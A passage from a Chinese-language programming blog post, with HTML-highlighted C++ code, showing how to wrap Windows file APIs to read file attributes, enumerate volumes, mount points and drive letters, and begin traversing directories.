li;</span><br><span class=\"line\">    li.LowPart  = low;</span><br><span class=\"line\">    li.HighPart = high;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> KEEP_WIN32_NATIVE_TIMESTAMP_VALUE</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> li.QuadPart;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">    <span class=\"comment\">/* Convert ticks since 1/1/1970 into seconds */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (li.QuadPart - UNIX_TIME_START) / TICKS_PER_SECOND;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>基于以上概念给<code>StatResult</code>添加相关方法及实现：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> <span class=\"title\">StatResult::AccessTime</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">ConvertWin32Time</span>(m_handleFileInformation.ftLastAccessTime.dwLowDateTime,</span><br><span class=\"line\">        m_handleFileInformation.ftLastAccessTime.dwHighDateTime);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> <span class=\"title\">StatResult::CreationTime</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">ConvertWin32Time</span>(m_handleFileInformation.ftCreationTime.dwLowDateTime,</span><br><span class=\"line\">        m_handleFileInformation.ftCreationTime.dwHighDateTime);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> <span class=\"title\">StatResult::ModifyTime</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">ConvertWin32Time</span>(m_handleFileInformation.ftLastWriteTime.dwLowDateTime,</span><br><span class=\"line\">        m_handleFileInformation.ftLastWriteTime.dwHighDateTime);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> <span class=\"title\">StatResult::UniqueID</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">CombineDWORD</span>(m_handleFileInformation.nFileIndexLow,</span><br><span class=\"line\">        m_handleFileInformation.nFileIndexHigh);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> <span class=\"title\">StatResult::Size</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">CombineDWORD</span>(m_handleFileInformation.nFileSizeLow,</span><br><span class=\"line\">        m_handleFileInformation.nFileSizeHigh);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> <span class=\"title\">StatResult::DeviceID</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">uint64_t</span>&gt;(m_handleFileInformation.dwVolumeSerialNumber);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint64_t</span> <span class=\"title\">StatResult::LinksCount</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">uint64_t</span>&gt;(m_handleFileInformation.nNumberOfLinks);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>DWORD描述的<code>dwFileAttributes</code>可以与一系列系统常量相与来判断文件是否是某种类型：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsDirectory</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsArchive</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_ARCHIVE) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsCompressed</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_COMPRESSED) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsEncrypted</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_ENCRYPTED) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsSparseFile</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_SPARSE_FILE) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsHidden</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_HIDDEN) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsOffline</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_OFFLINE) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsReadOnly</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_READONLY) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsSystem</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_SYSTEM) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsTemporary</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_TEMPORARY) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsNormal</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_NORMAL) != <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">StatResult::IsReparsePoint</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> (m_handleFileInformation.dwFileAttributes &amp; FILE_ATTRIBUTE_REPARSE_POINT) != <span class=\"number\">0</span>; &#125;</span><br></pre></td></tr></table></figure><br>相关<code>FILE_ATTRIBUTE_XXX</code>常量详见：<a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/file-attribute-constants\">File Attribute Constants</a></p>\n<p>上述我们尝试实现Windows上对于Linux下<code>stat</code>的替换方案，用Windows API重新封装了一个<code>StatW</code>。实际上Windows也提供了<code>stat</code>方法：<a href=\"https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/stat-functions?redirectedfrom=MSDN&amp;view=msvc-170\">stat functions</a>，提供了Linux下<code>stat</code>一样的参数列表，返回结构<code>struct stat</code>也有一样的成员结构。只不过该方法只是用于给Linux程序迁移到Windows提供遍历，它并不能获取完整的Windows文件信息。</p>\n<h2 id=\"卷与驱动器\"><a href=\"#卷与驱动器\" class=\"headerlink\" title=\"卷与驱动器\"></a>卷与驱动器</h2><p>Windows文件系统有<strong>卷</strong>与<strong>驱动器</strong>的概念，其中卷（Volume）和Linux中卷的概念一致，卷可以是物理卷、也可以是逻辑卷，卷可能是本地卷、也可能是网络卷（SMB），可能是可读写的，也可能是只读的。</p>\n<p>每个卷对应唯一的卷名（VolumeName），每个卷又属于唯一的设备（Device），每个卷可能被挂载在若干数量的路径上。他我们先定义一个<code>Win32VolumeDetail</code>类，一步步了解卷的相关属性的获取：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Win32VolumesDetail</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">Win32VolumesDetail</span>(<span class=\"keyword\">const</span> std::wstring&amp; wVolumeName);</span><br><span class=\"line\">    <span class=\"function\">std::wstring <span class=\"title\">VolumeNameW</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\">std::optional&lt;std::wstring&gt; <span class=\"title\">GetVolumeDeviceNameW</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    std::optional&lt;std::vector&lt;std::wstring&gt;&gt; <span class=\"built_in\">GetVolumePathListW</span>();</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    std::wstring m_wVolumeName;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<p>首先通过API <code>FindFirstVolumeW()</code>和<code>FindNextVolumeW()</code>可以遍历所有的卷。VolumeName最大长度不会超过路径的最大长度，可以用Win32 API预制宏<code>MAX_PATH</code>定义。<code>FindFirstVolume</code>成功执行会返回第一个卷的句柄，通过它和<code>FindNextVolumeW()</code>可以遍历并列出所有的卷名（VolumeName）。</p>\n<blockquote>\n<p><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findnextvolumew\">FindNextVolumeW function (fileapi.h)</a></p>\n</blockquote>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">constexpr</span> <span class=\"keyword\">auto</span> VOLUME_BUFFER_MAX_LEN = MAX_PATH;</span><br><span class=\"line\"><span class=\"keyword\">constexpr</span> <span class=\"keyword\">auto</span> VOLUME_PATH_MAX_LEN = MAX_PATH;</span><br><span class=\"line\"></span><br><span class=\"line\">std::optional&lt;std::vector&lt;Win32VolumesDetail&gt;&gt; <span class=\"built_in\">GetWin32VolumeList</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    std::vector&lt;std::wstring&gt; wVolumes;</span><br><span class=\"line\">    std::vector&lt;Win32VolumesDetail&gt; volumeDetails;</span><br><span class=\"line\">    WCHAR wVolumeNameBuffer[VOLUME_BUFFER_MAX_LEN] = <span class=\"string\">L&quot;&quot;</span>;</span><br><span class=\"line\">    HANDLE handle = ::<span class=\"built_in\">FindFirstVolumeW</span>(wVolumeNameBuffer, VOLUME_BUFFER_MAX_LEN);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (handle == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">FindVolumeClose</span>(handle);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    wVolumes.<span class=\"built_in\">push_back</span>(std::<span class=\"built_in\">wstring</span>(wVolumeNameBuffer));</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (::<span class=\"built_in\">FindNextVolumeW</span>(handle, wVolumeNameBuffer, VOLUME_BUFFER_MAX_LEN)) &#123;</span><br><span class=\"line\">        wVolumes.<span class=\"built_in\">push_back</span>(std::<span class=\"built_in\">wstring</span>(wVolumeNameBuffer));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ::<span class=\"built_in\">FindVolumeClose</span>(handle);</span><br><span class=\"line\">    handle = INVALID_HANDLE_VALUE;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> std::wstring&amp; wVolumeName : wVolumes) &#123;</span><br><span class=\"line\">        <span class=\"function\">Win32VolumesDetail <span class=\"title\">volumeDetail</span><span class=\"params\">(wVolumeName)</span></span>;</span><br><span class=\"line\">        volumeDetails.<span class=\"built_in\">push_back</span>(volumeDetail);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> volumeDetails;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* member methods implementation for Win32VolumeDetail */</span></span><br><span class=\"line\">Win32VolumesDetail::<span class=\"built_in\">Win32VolumesDetail</span>(<span class=\"keyword\">const</span> std::wstring&amp; wVolumeName) : <span class=\"built_in\">m_wVolumeName</span>(wVolumeName) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::wstring <span class=\"title\">Win32VolumesDetail::VolumeNameW</span><span class=\"params\">()</span> <span class=\"keyword\">const</span> </span>&#123; <span class=\"keyword\">return</span> m_wVolumeName; &#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>该方法只能查询本地卷，不能查询网络卷。</p>\n</blockquote>\n<p>拿到的卷名形如<code>\\\\?\\Volume&#123;a501f5cc-311e-423c-bc58-94a6c1b6b509&#125;\\</code>，由<code>\\\\?\\Volume</code>和一串GUID构成。有了卷名就可以查询设备和挂载点了。API <code>QueryDosDeviceW</code>用于根据卷名查询对应设备名，设备名同样最大不超过<code>MAX_PATH</code>，代码如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::optional&lt;std::wstring&gt; <span class=\"title\">Win32VolumesDetail::GetVolumeDeviceNameW</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_wVolumeName.<span class=\"built_in\">size</span>() &lt; <span class=\"number\">4</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">0</span>] != <span class=\"string\">L&#x27;\\\\&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">1</span>] != <span class=\"string\">L&#x27;\\\\&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">2</span>] != <span class=\"string\">L&#x27;?&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">3</span>] != <span class=\"string\">L&#x27;\\\\&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName.<span class=\"built_in\">back</span>() != <span class=\"string\">L&#x27;\\\\&#x27;</span>) &#123; <span class=\"comment\">/* illegal volume name */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::wstring wVolumeParam = m_wVolumeName;</span><br><span class=\"line\">    wVolumeParam.<span class=\"built_in\">pop_back</span>(); <span class=\"comment\">/* QueryDosDeviceW does not allow a trailing backslash */</span></span><br><span class=\"line\">    wVolumeParam = wVolumeParam.<span class=\"built_in\">substr</span>(<span class=\"number\">4</span>);</span><br><span class=\"line\">    WCHAR deviceNameBuf[DEVICE_BUFFER_MAX_LEN] = <span class=\"string\">L&quot;&quot;</span>;</span><br><span class=\"line\">    DWORD charCount = ::<span class=\"built_in\">QueryDosDeviceW</span>(wVolumeParam.<span class=\"built_in\">c_str</span>(), deviceNameBuf, <span class=\"built_in\">ARRAYSIZE</span>(deviceNameBuf));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (charCount == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;std::wstring&gt;(deviceNameBuf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>查询到的设备名形如：<code>\\Device\\HarddiskVolume3</code>，由设备类型和序号组成。</p>\n<p>一个卷可能由0个、1个或者多个挂载点，可以用<code>GetVolumePathNamesForVolumeNameW</code>获得：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">std::optional&lt;std::vector&lt;std::wstring&gt;&gt; Win32VolumesDetail::<span class=\"built_in\">GetVolumePathListW</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* https://learn.microsoft.com/en-us/windows/win32/fileio/displaying-volume-paths */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_wVolumeName.<span class=\"built_in\">size</span>() &lt; <span class=\"number\">4</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">0</span>] != <span class=\"string\">L&#x27;\\\\&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">1</span>] != <span class=\"string\">L&#x27;\\\\&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">2</span>] != <span class=\"string\">L&#x27;?&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName[<span class=\"number\">3</span>] != <span class=\"string\">L&#x27;\\\\&#x27;</span> ||</span><br><span class=\"line\">        m_wVolumeName.<span class=\"built_in\">back</span>() != <span class=\"string\">L&#x27;\\\\&#x27;</span>) &#123; <span class=\"comment\">/* illegal volume name */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    std::vector&lt;std::wstring&gt; wPathList;</span><br><span class=\"line\">    PWCHAR devicePathNames = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    DWORD charCount = MAX_PATH + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> success = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">        devicePathNames = (PWCHAR) <span class=\"keyword\">new</span> BYTE[charCount * <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(WCHAR)];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!devicePathNames) &#123; <span class=\"comment\">/* failed to malloc on heap */</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        success = ::<span class=\"built_in\">GetVolumePathNamesForVolumeNameW</span>(</span><br><span class=\"line\">            m_wVolumeName.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">            devicePathNames,</span><br><span class=\"line\">            charCount,</span><br><span class=\"line\">            &amp;charCount</span><br><span class=\"line\">        );</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (success || ::<span class=\"built_in\">GetLastError</span>() != ERROR_MORE_DATA) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">delete</span>[] devicePathNames;</span><br><span class=\"line\">        devicePathNames = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (success) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (PWCHAR nameIdx = devicePathNames;</span><br><span class=\"line\">            nameIdx[<span class=\"number\">0</span>] != <span class=\"string\">L&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">            nameIdx += ::<span class=\"built_in\">wcslen</span>(nameIdx) + <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">            wPathList.<span class=\"built_in\">push_back</span>(std::<span class=\"built_in\">wstring</span>(nameIdx));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (devicePathNames != <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">delete</span>[] devicePathNames;</span><br><span class=\"line\">        devicePathNames = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;std::vector&lt;std::wstring&gt;&gt;(wPathList);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>查询到的挂载点是Windows文件路径，例如：<code>C:\\</code>，<code>D:\\</code>，<code>E:\\dir\\mount\\</code>（挂载点可以不是根目录）</p>\n<p><strong>驱动器（Driver）</strong>是区别于卷的Windows特有的概念，驱动器有26个字母盘符可供选择。其中<code>A</code>、<code>B</code>盘是早期用于标记软盘，如今驱动器一般从<code>C</code>开始分配。不同于Posix路径以<code>/</code>作为文件系统的根目录，Windows每个驱动器都有自己的根目录例如<code>C:\\</code>、<code>D:\\</code>。一般每个磁盘系统会分配一个驱动器，如果驱动器盘符耗尽，可以把磁盘挂载在某个驱动器的某个<strong>空白的NTFS卷的目录</strong>下例如<code>E:\\dir\\mount</code>。Windows文件系统路径一般以反斜杠（Backslash）作为分隔符（Path Separator），而Posix路径一般以左斜杠（Slash）作为分隔符。Win32 API一般也接受非标准的路径例如：<code>C:\\User/XUranus/Desktop</code>，但一些C++标准库对Windows路径有着严格要求，必须写作<code>C:\\User\\XUranus\\Desktop</code>，否则会调用失败。</p>\n<blockquote>\n<p>驱动器分配可以在“磁盘管理”中右击某个卷选择“更改驱动器号和路径”，可以为卷删除、或者添加一个或多个盘符或挂载路径。对于装载到某个“空白的NTFS卷目录”，实际上是给那个目录创建了一个MountPoint类型的指向点(REPARSE POINT)，我们将在下一章详解REPARSE POINT。<strong>与Linux文件系统的挂载不同，这种装载类似于将这个空白目录修改成了软连接，会导致文件系统成环！</strong>。</p>\n</blockquote>\n<p>Windows提供API <code>GetLogicalDriveStrings</code>用于获得所有<strong>已分配的驱动器卷标</strong>：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::vector&lt;std::wstring&gt; <span class=\"title\">GetWin32DriverListW</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    std::vector&lt;std::wstring&gt; wdrivers;</span><br><span class=\"line\">    DWORD dwLen = ::<span class=\"built_in\">GetLogicalDriveStrings</span>(<span class=\"number\">0</span>, <span class=\"literal\">nullptr</span>); <span class=\"comment\">/* the length of volumes str */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dwLen &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> wdrivers;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">wchar_t</span>* pszDriver = <span class=\"keyword\">new</span> <span class=\"keyword\">wchar_t</span>[dwLen];</span><br><span class=\"line\">    ::<span class=\"built_in\">GetLogicalDriveStringsW</span>(dwLen, pszDriver);</span><br><span class=\"line\">    <span class=\"keyword\">wchar_t</span>* pDriver = pszDriver;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (*pDriver != <span class=\"string\">&#x27;\\0&#x27;</span>) &#123;</span><br><span class=\"line\">        std::wstring wDriver = std::<span class=\"built_in\">wstring</span>(pDriver);</span><br><span class=\"line\">        wdrivers.<span class=\"built_in\">push_back</span>(wDriver);</span><br><span class=\"line\">        pDriver += wDriver.<span class=\"built_in\">length</span>() + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span>[] pszDriver;</span><br><span class=\"line\">    pszDriver = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    pDriver = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wdrivers;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>返回结果形如：<code>&#123;&quot;C:\\&quot;,&quot;D:\\&quot;,&quot;E:\\&quot;&#125;</code></p>\n<h2 id=\"目录遍历\"><a href=\"#目录遍历\" class=\"headerlink\" title=\"目录遍历\"></a>目录遍历</h2><p>Linux下用Posix接口遍历目录的流程是：</p>\n<ol>\n<li>用<code>opendir()</code>打开一个目录，获取一个<code>struct dirent*</code>类型的句柄</li>\n<li>用<code>readdir()</code>传入之前的<code>struct dirent*</code>句柄并返回下一个句柄</li>\n</ol>\n<p>循环该过程直到<code>struct dirent*</code>为<code>nullptr</code>。</p>\n<p>Windows下遍历目录也有类似的过程，和之前封装<code>StatResult</code>模拟<code>stat</code>一样，这里来封装一个<code>OpenDirEntry</code>模拟<code>struct dirent</code>：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OpenDirEntry</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">OpenDirEntry</span>(</span><br><span class=\"line\">        <span class=\"keyword\">const</span> std::string&amp;          dirPath,</span><br><span class=\"line\">        <span class=\"keyword\">const</span> WIN32_FIND_DATAW&amp;     findFileData,</span><br><span class=\"line\">        <span class=\"keyword\">const</span> HANDLE&amp;               fileHandle);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">IsDirectory</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\">std::wstring <span class=\"title\">NameW</span><span class=\"params\">()</span> <span class=\"keyword\">const</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Next</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/* disable copy/assign construct */</span></span><br><span class=\"line\">    <span class=\"built_in\">OpenDirEntry</span>(<span class=\"keyword\">const</span> OpenDirEntry&amp;) = <span class=\"keyword\">delete</span>;</span><br><span class=\"line\">    OpenDirEntry <span class=\"keyword\">operator</span> = (<span class=\"keyword\">const</span> OpenDirEntry&amp;) = <span class=\"keyword\">delete</span>;</span><br><span class=\"line\">    ~<span class=\"built_in\">OpenDirEntry</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    std::wstring m_dirPath;</span><br><span class=\"line\">    HANDLE m_fileHandle = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    WIN32_FIND_DATAW m_findFileData;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure><br><code>OpenDirEntry</code>描述目录遍历过程中的一个入口，提供<code>IsDirectory</code>判断入口是否是目录，<code>NameW()</code>返回入口的名称，<code>Next()</code>返回是否遍历结束。<code>WIN32_FIND_DATAW</code>是用于存放遍历过程入口信息的结构，<code>HANDLE</code>指向当前遍历入口的句柄：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">OpenDirEntry::<span class=\"built_in\">OpenDirEntry</span>(</span><br><span class=\"line\">    <span class=\"keyword\">const</span> std::string&amp;      dirPath,</span><br><span class=\"line\">    <span class=\"keyword\">const</span> WIN32_FIND_DATAW&amp; findFileData,</span><br><span class=\"line\">    <span class=\"keyword\">const</span> HANDLE&amp;           fileHandle)</span><br><span class=\"line\">    : <span class=\"built_in\">m_dirPath</span>(<span class=\"built_in\">Utf8ToUtf16</span>(dirPath)), <span class=\"built_in\">m_findFileData</span>(findFileData), <span class=\"built_in\">m_fileHandle</span>(fileHandle) &#123;&#125;</span><br></pre></td></tr></table></figure><br>Windows文件遍历用到的API是<code>FindFirstFileW()</code>和<code>FindNextFileW()</code>。<code>FindFirstFileW()</code>接受一个路径的模式串，如果能找到一个复合的遍历入口则返回对应的入口句柄。<code>FindNextFileW()</code>基于当前句柄返回下一个入口对应的句柄，如果找不到则返回<code>INVALID_HANDLE_VALUE</code>。遍历过程中当前入口的信息存放在<code>WIN32_FIND_DATAW 